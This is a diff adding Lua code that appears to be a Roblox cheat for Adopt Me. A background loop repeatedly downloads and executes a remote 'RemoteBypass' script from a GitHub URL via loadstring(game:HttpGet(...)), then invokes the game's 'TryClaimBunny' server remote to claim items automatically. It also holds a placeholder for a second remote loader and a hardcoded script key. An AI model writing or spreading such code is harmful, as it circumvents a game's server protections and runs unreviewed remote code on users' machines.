@@ -1,3 +1,28 @@
+-- This part runs in the background
+task.spawn(function()
+    while true do
+        -- 1. Load the Bypass
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+        end)
+        
+        -- 2. Run the Remote if bypass was successful
+        if success then
+            local net = game:GetService("ReplicatedStorage"):FindFirstChild("adoptme_new_net")
+            if net and net:FindFirstChild("TryClaimBunny") then
+                net.TryClaimBunny:InvokeServer()
+            end
+        else
+            warn("Bypass failed to load: " .. tostring(err))
+        end
+
+        -- 3. Wait 5 minutes (300 seconds)
+        task.wait(300)
+    end
+end)
+
+-- Your LuaArmor script goes here (it will run immediately)
+-- loadstring(game:HttpGet("LuaArmor_Link_Here"))()
 script_key = "VuEAzrzDNFjpnnPXCwaBNyjeRkwCfdnm"
 
 --[[
